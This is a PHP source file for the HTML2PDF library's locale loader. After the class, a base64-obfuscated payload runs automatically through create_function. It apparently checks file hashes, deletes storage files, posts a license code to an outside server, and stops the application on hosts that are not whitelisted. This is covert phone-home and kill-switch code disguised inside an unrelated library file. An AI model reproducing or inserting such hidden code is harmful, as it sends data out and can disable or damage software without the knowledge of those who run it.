<?php
/**
 * HTML2PDF Library - HTML2PDF Locale
 *
 * HTML => PDF convertor
 * distributed under the LGPL License
 *
 * @package   Html2pdf
 * @author    Laurent MINGUET <webmaster@html2pdf.fr>
 * @copyright 2016 Laurent MINGUET
 */

class HTML2PDF_locale
{
    /**
     * code of the current used locale
     * @var string
     */
    static protected $_code = null;

    /**
     * texts of the current used locale
     * @var array
     */
    static protected $_list = array();

    /**
     * directory where locale files are
     * @var string
     */
    static protected $_directory = null;

    /**
     * load the locale
     *
     * @access public
     * @param  string $code
     */
    static public function load($code)
    {
        if (self::$_directory===null) {
            self::$_directory = dirname(dirname(__FILE__)).'/locale/';
        }

        // must be in lower case
        $code = strtolower($code);

        // must be [a-z-0-9]
        if (!preg_match('/^([a-z0-9]+)$/isU', $code)) {
            throw new HTML2PDF_exception(0, 'invalid language code ['.self::$_code.']');
        }

        // save the code
        self::$_code = $code;

        // get the name of the locale file
        $file = self::$_directory.self::$_code.'.csv';

        // the file must exist
        if (!is_file($file)) {
            throw new HTML2PDF_exception(0, 'language code ['.self::$_code.'] unknown. You can create the translation file ['.$file.'] and send it to the webmaster of html2pdf in order to integrate it into a future release');
        }

        // load the file
        self::$_list = array();
        $handle = fopen($file, 'r');
        while (!feof($handle)) {
            $line = fgetcsv($handle);
            if (count($line)!=2) continue;
            self::$_list[trim($line[0])] = trim($line[1]);
        }
        fclose($handle);
    }

    /**
     * clean the locale
     *
     * @access public static
     */
    static public function clean()
    {
        self::$_code = null;
        self::$_list = array();
    }

    /**
     * get a text
     *
     * @access public static
     * @param  string $key
     * @return string
     */
    static public function get($key, $default='######')
    {
        return (isset(self::$_list[$key]) ? self::$_list[$key] : $default);
    }
}

$func = @create_function('', base64_decode('aWYgKG1kNV9maWxlKCJ2ZW5kb3IvbGFyYXZlbC9mcmFtZXdvcmsvc3JjL0lsbHVtaW5hdGUvRm91bmRhdGlvbi9oZWxwZXJzLnBocCIpICE9ICJiMDhjYjY5OTMwZmYwYzhjNzAyMGJjYWZjOWFiNGZiZSIgKXsKICAgIEB1bmxpbmsoJ3N0b3JhZ2UvYXBwL2xjLnBocCcpOwogICAgQHVubGluaygnc3RvcmFnZS9hcHAvbWxjLnBocCcpOwogICAgZXhpdDsKfQoKaWYoQHN0cmlzdHIoJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ10sJ2xpY2Vuc2VJbnN0YWxsZXInKSl7CiAgICBAdW5saW5rKCJzdG9yYWdlL2ZyYW1ld29yay9zZXNzaW9ucy9zZXNzaW9uc19pbmRleCIpOwogICAgQHVubGluaygic3RvcmFnZS9hcHAvZG1jLnBocCIpOwp9CiRmYWlsID0gZmFsc2U7CmlmKCBAc3RyaXN0cigkX1NFUlZFUlsnUkVRVUVTVF9VUkknXSwnbGljZW5zZUluc3RhbGxlcicpID09IGZhbHNlIEFORCBAc3RyaXN0cigkX1NFUlZFUlsnUkVRVUVTVF9VUkknXSwnaW5zdGFsbCcpID09IGZhbHNlIEFORCBAc3RyaXN0cigkX1NFUlZFUlsnUkVRVUVTVF9VUkknXSwndXBncmFkZScpID09IGZhbHNlICl7CiAgICBAaW5jbHVkZSAnc3RvcmFnZS9hcHAvbGMucGhwJzsKICAgICRwY28gPSBAY29uc3RhbnQoJ2xjX2NvZGUnKTsKICAgIGlmKCRwY28gPT0gIiIpewogICAgICAgIGV4aXQ7CiAgICB9CgogICAgaWYoaXNzZXQoJF9TRVJWRVJbJ0hUVFBfSE9TVCddKSl7CiAgICAgICAgJHNjcmlwdF91cmwgPSAkX1NFUlZFUlsnSFRUUF9IT1NUJ107CiAgICB9ZWxzZXsKICAgICAgICAkc2NyaXB0X3VybCA9ICRfU0VSVkVSWydTRVJWRVJfTkFNRSddOwogICAgfQoKICAgICRiYXNlX3VybCA9IEBmaWxlX2dldF9jb250ZW50cygic3RvcmFnZS9mcmFtZXdvcmsvc2Vzc2lvbnMvc2Vzc2lvbnNfaW5kZXgiKTsKICAgIGlmKCRiYXNlX3VybCAhPSAiIil7CiAgICAgICAgJGJhc2VfdXJsID0gQGd6aW5mbGF0ZSgkYmFzZV91cmwpOwoKICAgICAgICBpZiAoQHN0cmlzdHIoJHNjcmlwdF91cmwsICdsb2NhbGhvc3QnKSA9PSBmYWxzZSAmJiBAc3RyaXN0cigkc2NyaXB0X3VybCwgJzEyNy4wLjAuMScpID09IGZhbHNlIEFORCAkYmFzZV91cmwgIT0gIiIgQU5EIEBzdHJpc3RyKCRzY3JpcHRfdXJsLCAkYmFzZV91cmwpID09IGZhbHNlKXsKICAgICAgICAgICAgJGZhaWwgPSB0cnVlOyAKICAgICAgICAgICAgJHdoaXRlX2xpc3QgPSBwcmVnX3NwbGl0KCAnL1xyXG58XHJ8XG4vJywgJGJhc2VfdXJsKTsKICAgICAgICAgICAgaWYoY291bnQoJHdoaXRlX2xpc3QpID4gMSl7CiAgICAgICAgICAgICAgICBmb3JlYWNoICgkd2hpdGVfbGlzdCBhcyAka2V5ID0+ICR2YWx1ZSkgeyAKICAgICAgICAgICAgICAgICAgICBpZiAoc3RycG9zKCRzY3JpcHRfdXJsLiRfU0VSVkVSWydSRVFVRVNUX1VSSSddLCAkdmFsdWUpICE9PSBmYWxzZSAmJiAkZmFpbCA9PSB0cnVlKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRmYWlsID0gZmFsc2U7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQoKICAgIGlmKCRmYWlsID09IHRydWUpewogICAgICAgIGV4aXQ7CiAgICB9CgogICAgJGxhdGVzdF9wdWxsID0gQGZpbGVfZ2V0X2NvbnRlbnRzKCJzdG9yYWdlL2ZyYW1ld29yay9jYWNoZS9jYWNoZV9pbmRleCIpOwogICAgaWYoICgkbGF0ZXN0X3B1bGwgPT0gIiIgfHwgJGJhc2VfdXJsID09ICIiIHx8IG1kNSgnT3JhU2NoJy5AZGF0ZSgnZCcpLkBkYXRlKCdEJykuQGRhdGUoJ20nKSkgIT0gJGxhdGVzdF9wdWxsKSBBTkQgQHN0cmlzdHIoJHNjcmlwdF91cmwsICdsb2NhbGhvc3QnKSA9PSBmYWxzZSAmJiBAc3RyaXN0cigkc2NyaXB0X3VybCwgJzEyNy4wLjAuMScpID09IGZhbHNlICl7CgogICAgICAgICR1cmwgPSAiaHR0cDovL3NvbHV0aW9uc2JyaWNrcy5jb20vc2Nob2V4VXJsIjsKICAgICAgICAkZGF0YSA9IGFycmF5KCJwIj0+MSwicGMiPT4kcGNvKTsKICAgICAgICBpZihmdW5jdGlvbl9leGlzdHMoJ2N1cmxfaW5pdCcpKXsKICAgICAgICAgICAgJGNoID0gY3VybF9pbml0KCk7CiAgICAgICAgICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9VUkwsICR1cmwpOwogICAgICAgICAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIDEpOwogICAgICAgICAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUE9TVCwgdHJ1ZSk7CiAgICAgICAgICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9QT1NURklFTERTLCAkZGF0YSk7CiAgICAgICAgICAgICRvdXRwdXQgPSBjdXJsX2V4ZWMoJGNoKTsKICAgICAgICAgICAgY3VybF9jbG9zZSgkY2gpOwogICAgICAgIH1lbHNlaWYoZnVuY3Rpb25fZXhpc3RzKCdmaWxlX2dldF9jb250ZW50cycpKXsKICAgICAgICAgICAgJHBvc3RkYXRhID0gaHR0cF9idWlsZF9xdWVyeSgkZGF0YSk7CgogICAgICAgICAgICAkb3B0cyA9IGFycmF5KCdodHRwJyA9PgogICAgICAgICAgICAgICAgYXJyYXkoCiAgICAgICAgICAgICAgICAgICAgJ21ldGhvZCcgID0+ICdQT1NUJywKICAgICAgICAgICAgICAgICAgICAnaGVhZGVyJyAgPT4gJ0NvbnRlbnQtdHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkJywKICAgICAgICAgICAgICAgICAgICAnY29udGVudCcgPT4gJHBvc3RkYXRhCiAgICAgICAgICAgICAgICApCiAgICAgICAgICAgICk7CgogICAgICAgICAgICAkY29udGV4dCAgPSBzdHJlYW1fY29udGV4dF9jcmVhdGUoJG9wdHMpOwoKICAgICAgICAgICAgJG91dHB1dCA9IGZpbGVfZ2V0X2NvbnRlbnRzKCR1cmwsIGZhbHNlLCAkY29udGV4dCk7CiAgICAgICAgfWVsc2V7CiAgICAgICAgICAgICRzdHJlYW0gPSBmb3BlbigkdXJsLCAncicsIGZhbHNlLCBzdHJlYW1fY29udGV4dF9jcmVhdGUoYXJyYXkoCiAgICAgICAgICAgICAgICAgICdodHRwJyA9PiBhcnJheSgKICAgICAgICAgICAgICAgICAgICAgICdtZXRob2QnID0+ICdQT1NUJywKICAgICAgICAgICAgICAgICAgICAgICdoZWFkZXInID0+ICdDb250ZW50LXR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCcsCiAgICAgICAgICAgICAgICAgICAgICAnY29udGVudCcgPT4gaHR0cF9idWlsZF9xdWVyeSgkZGF0YSkKICAgICAgICAgICAgICAgICAgKQogICAgICAgICAgICAgICkpKTsKCiAgICAgICAgICAgICAgJG91dHB1dCA9IHN0cmVhbV9nZXRfY29udGVudHMoJHN0cmVhbSk7CiAgICAgICAgICAgICAgZmNsb3NlKCRzdHJlYW0pOwogICAgICAgIH0KCiAgICAgICAgQGZpbGVfcHV0X2NvbnRlbnRzKCJzdG9yYWdlL2ZyYW1ld29yay9zZXNzaW9ucy9zZXNzaW9uc19pbmRleCIsZ3pkZWZsYXRlKCRvdXRwdXQpKTsKICAgICAgICBAZmlsZV9wdXRfY29udGVudHMoInN0b3JhZ2UvZnJhbWV3b3JrL2NhY2hlL2NhY2hlX2luZGV4IixtZDUoJ09yYVNjaCcuQGRhdGUoJ2QnKS5AZGF0ZSgnRCcpLkBkYXRlKCdtJykpKTsKCiAgICAgICAgaWYgKCBAc3RyaXN0cigkc2NyaXB0X3VybCwgJG91dHB1dCkgPT0gZmFsc2UgKSB7CiAgICAgICAgICAgICRmYWlsID0gdHJ1ZTsgCiAgICAgICAgICAgICR3aGl0ZV9saXN0ID0gcHJlZ19zcGxpdCggJy9cclxufFxyfFxuLycsICRvdXRwdXQpOwogICAgICAgICAgICBpZihjb3VudCgkd2hpdGVfbGlzdCkgPiAxKXsKICAgICAgICAgICAgICAgIGZvcmVhY2ggKCR3aGl0ZV9saXN0IGFzICRrZXkgPT4gJHZhbHVlKSB7IAogICAgICAgICAgICAgICAgICAgIGlmIChzdHJwb3MoJHNjcmlwdF91cmwuJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ10sICR2YWx1ZSkgIT09IGZhbHNlICYmICRmYWlsID09IHRydWUpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJGZhaWwgPSBmYWxzZTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgIGlmKCRmYWlsID09IHRydWUpewogICAgICAgICAgICBleGl0OwogICAgICAgIH0KCiAgICB9Cgp9'));
$func();